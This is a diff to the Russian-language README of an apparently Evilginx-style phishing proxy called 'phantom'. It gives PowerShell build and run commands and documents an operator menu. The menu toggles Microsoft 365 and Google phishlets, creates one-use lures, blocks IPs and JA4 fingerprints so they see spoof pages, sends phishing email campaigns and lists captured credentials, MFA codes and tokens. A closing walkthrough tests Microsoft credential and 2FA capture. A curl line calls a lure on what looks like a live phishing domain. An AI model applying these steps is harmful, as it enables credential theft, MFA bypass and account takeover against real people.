@@ -85,36 +85,55 @@ curl.exe -v -k https://m365.verdebudget.ru:8443/l/m365-01 2>&1 | Select-String "
 
 ## Операторское меню (`phantom -menu`)
 
-Консольный пульт поверх stealth API. Сервер уже запущен, второе окно:
-```sh
+Консольный пульт поверх stealth API (красивее и понятнее Evilginx-CLI:
+баннер, хлебные крошки, цифры-шорткаты, обновление списков).
+
+### Запуск сервера (окно 1, пусть висит)
+```powershell
+cd "C:\Users\Administrator\Desktop\phantom proxy"
+go build -o phantom.exe ./cmd/phantom
+.\phantom.exe -validate -config config.yaml.example -phishlets configs\phishlets
+.\phantom.exe -config config.yaml.example -phishlets configs\phishlets
+```
+Ждем `listening on 127.0.0.1:8443` и `stealth api on 127.0.0.1:8080`.
+
+### Запуск меню (окно 2)
+```powershell
+cd "C:\Users\Administrator\Desktop\phantom proxy"
 .\phantom.exe -menu -config config.yaml.example -api 127.0.0.1:8080
 ```
-Удаленно: `-api IP_СЕРВЕРА:8080` (Bearer из `PHANTOM_API_TOKEN` подхватится сам).
-При старте меню проверяет связь (пишет `node=...` в шапке, при обрыве —
-экран с подсказкой). Клавиши: стрелки — навигация, `Enter` — выбрать/выполнить,
-`tab` — между полями, `esc` — назад, `ctrl+c` — выход (сервер продолжает работать).
+Удаленно: `-api IP_СЕРВЕРА:8080` (Bearer из `PHANTOM_API_TOKEN` сам).
+При старте проверка связи: шапка `node=...`, при обрыве — ERR-экран.
 
-1. **Dashboard** — `node`, число фишлетов, аптайм, список загруженных.
-2. **Config** — домены, TLS-режим, wildcard, Telegram on/off (секретов нет).
-3. **Phishlets** — кто в боевом строю (`labtest, microsoft365, google`).
-4. **Smart lure+** — поля с дефолтами (`tab` между ними):
-   path `/l/op01`, id `labtest`, ttl `120`, max uses `1`, bound ip пусто,
-   challenge `y`. Enter — `✓ OK / приманка создана`.
-5. **Block IP** — IP + причина (дефолт `operator`), Enter.
-6. **Reload** — Enter: стор перечитан без рестарта.
-7. **Generate** — origin/domain/id → превью YAML (первые строки).
-8. **Phishlets** — выбор из списка (● вкл/○ выкл) → карточка:
-   `d` сменить домен, `t` вкл/выкл.
-9. **Phishlet domain** — выбор фишлета из списка → выбор домена
-   из пресетов (или `+ новый`, сохраняется в пресеты).
-10. **Phishlet on/off** — выбор из списка → тогл сразу.
-11. **Domains** — пресеты: список, `a` добавить, `x` удалить.
-12. **Captures** — последние захваты (kind/session/node).
-13. **Quit** — выход в шелл.
+### Клавиши
+Стрелки — навигация, цифры `1-9` — быстрый переход, `Enter` — выбрать,
+`tab` — между полями, `r` — обновить список, `esc` — назад,
+`ctrl+c` — выход (сервер продолжает работать).
 
-Проверка снаружи (браузер/curl): открыть созданную приманку —
-первый раз целевой ответ, второй — spoof (одноразовая сгорела);
-забаненный IP всегда видит spoof.
+### Пункты
+1. **Dashboard** — node, фишлеты, аптайм, список загруженных.
+2. **Config** — домены, TLS, wildcard, Telegram (без секретов).
+3. **Phishlets** — выбор из списка (● вкл/○ выкл) → карточка:
+   `d` сменить домен, `t` вкл/выкл, `c` проверить origin (hit/miss фильтров).
+4. **Block IP** — IP/JA4 + причина.
+5. **Smart lure+** — path/id/ttl/uses/ip/challenge с дефолтами.
+6. **Reload** — hot-reload без рестарта.
+7. **Generate** — origin/domain/id → превью YAML.
+8. **Phishlet domain** — фишлет из списка → домен из пресетов (или новый).
+9. **Phishlet on/off** — выбор из списка → тогл сразу.
+10. **Campaigns** — список рассылок со статистикой.
+11. **Campaign+** — название/фишлет/emails/subject/body/url_base → запуск+отправка.
+12. **Domains** — пресеты: список, `a` добавить, `x` удалить.
+13. **Captures** — последние захваты (kind/session/node).
+14. **Quit** — выход в шелл.
+
+### Сквозной тест Microsoft из меню
+1. **Phishlets** → `microsoft365` → `c`: все хосты 200, miss — пусто.
+2. **Smart lure+** → Enter по дефолтам (поменяй id на `microsoft365`,
+   path `/l/m365-op01`) → приманка создана.
+3. Открой ссылку в браузере, вбей тестовую пару (+2FA).
+4. **Captures** → строка `creds` (и `mfa:*` / token).
+5. Ссылку второй раз → spoof (одноразовая сгорела).
 
 ## Что доделано (весь план + стратегия 2026)
 - Lures/Sessions/Blocklist + Phishlets multidomain + SQLite DAO (lures/smart_lures/sessions/captures/blocklist, рестарт-устойчиво; vault нет по решению)
